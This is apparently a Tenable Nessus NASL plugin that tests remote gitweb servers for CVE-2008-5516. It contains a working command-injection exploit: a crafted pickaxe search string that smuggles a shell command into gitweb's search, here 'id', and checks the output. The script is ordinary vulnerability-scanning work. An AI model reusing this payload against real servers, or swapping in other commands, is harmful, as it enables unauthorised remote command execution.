#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if ( description )
{
  script_id(53336);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/11 20:19:25 $");

  script_cve_id("CVE-2008-5516");
  script_bugtraq_id(33355);
  script_osvdb_id(53539);
  script_xref(name:"Secunia", value:"33607");

  script_name(english:"GIT gitweb git_search Shell Metacharacter Arbitrary Command Execution");
  script_summary(english:"Tries to execute a command.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a CGI script that can be abused to
execute arbitrary commands."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of gitweb, a web-enabled interface to the open source
distributed version control system Git, hosted on the remote web
server fails to sanitize user-supplied input to the 'gitweb.cgi'
script of shell metacharacters before passing it to a shell.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary commands subject to the privileges under which the web
server operates."
  );

   # http://repo.or.cz/w/git.git?a=commitdiff;h=c582abae46725504cee9ff91816c979989632f07
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?075ee8af");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.5.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(78, 264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/01/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/03/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:git:git");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("url_func.inc");
include("webapp_func.inc");

global_var cgi, port;

function exploit(cmd, regex, repo)
{
  local_var matches, pattern, res, search, sha_commit, sha_file;
  local_var sha_null, url;

  # Get SHA-1 of HEAD.
  url = cgi + "?p=" + repo;
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : url,
    exit_on_fail : TRUE
  );

  pattern = '<a href="[^"]+\\?p=' + repo + ';a=commit;h=([a-z0-9]{40})">commit</a>';
  matches = eregmatch(string:res[2], pattern:pattern);
  if ( isnull(matches) ) return NULL;
  sha_commit = matches[1];

  # Get SHA-1 of any file.
  url = cgi + "?p=" + repo + ";a=tree;hb=" + sha_commit;
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : url,
    exit_on_fail : TRUE
  );

  pattern = '<a href="[^"]+\\?p=' + repo + ';a=blob;f=[^;]+;h=([a-z0-9]{40});hb=' + sha_commit + '">blob</a>';
  matches = eregmatch(string:res[2], pattern:pattern);
  if ( isnull(matches) ) return NULL;
  sha_file = matches[1];

  # Exploit.
  sha_null = '0000000000000000000000000000000000000000';
  search = "%27%27 | ";
  search += 'printf %22' + sha_commit + '\\n';
  search += '%3A000000 100644 ' + sha_null + ' ' + sha_file + ' A\\t%24%28' + cmd + '%29\\n';
  search += sha_null + '\\n%22%3B ';
  search += 'echo ' + SCRIPT_NAME + ' \\';

  search = str_replace(string:search, find:" ", replace:"+");

  url = cgi + "?p=" + repo + "&a=search&h=HEAD&st=pickaxe&s=" + search;
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : url,
    exit_on_fail : TRUE
  );

  pattern = '<span class="match">(' + regex + ')</span>';
  matches = eregmatch(string:res[2], pattern:pattern);
  if ( isnull(matches) ) exit(0, "The gitweb instance at " + build_url(port:port, qs:cgi) + " appears to be unaffected.");

  return make_list(url, matches[1]);
}

port = get_http_port(default:80);

# Loop through directories.
if ( thorough_tests ) dirs = list_uniq(make_list("/gitweb", "/cgi-bin/gitweb", "/git", "/code", cgi_dirs()));
else dirs = make_list(cgi_dirs());

# Find the gitweb CGI.
found = FALSE;
foreach dir ( dirs )
{
  foreach ext ( make_list("cgi", "pl", "perl") )
  {
    url = dir + "/gitweb." + ext;
    res = http_send_recv3(
      port         : port,
      method       : "GET",
      item         : url,
      exit_on_fail : TRUE
    );

    if (
      '<!-- git web interface version' >!< res[2] &&
      'meta name="generator" content="gitweb' >!< res[2]
    ) continue;

    cgi = url;
    found = TRUE;
    break;
  }

  if ( found ) break;
}
if ( ! found ) exit(0, "The web server on port " + port + " does not appear to host gitweb.");

# Scrape repository names from page.
pattern = "\?p=([^;]+);a=";
lines = egrep(string:res[2], pattern:pattern);
if ( isnull(lines) ) exit(1, "Failed to find any repositories at " + build_url(port:port, qs:cgi) + ".");

# Make a list of repositories.
repos = make_list();
foreach line ( split(lines) )
{
  matches = eregmatch(string:line, pattern:pattern);
  if ( isnull(matches) ) continue;

  repos = make_list(repos, matches[1]);
}
if ( max_index(repos) == 0 ) exit(1, "Failed to parse repositories at " + build_url(port:port, qs:cgi) + ".");

# Try to exploit each repo.
cmd = "id";
regex = "uid=[0-9]+.*gid=[0-9]+.*";
result = NULL;
foreach repo ( list_uniq(repos) )
{
  result = exploit(cmd:cmd, regex:regex, repo:repo);
  if ( ! isnull(result) ) break;
}
if ( isnull(result) ) exit(0, "The gitweb instance at " + build_url(port:port, qs:cgi) + " appears to be unaffected.");

# Report our findings.
if ( report_verbosity > 0 )
{
  trailer = "";
  if ( report_verbosity > 1 )
  {
    trailer =
      '\n' +
      'The above URL caused gitweb to execute the command \'' + cmd + '\'\n' +
      'resulting in the following output :\n' +
      '\n  ' + result[1] + '\n';
  }

  report = get_vuln_report(trailer:trailer, items:result[0], port:port);

  security_hole(port:port, extra:report);
}
else security_hole(port);
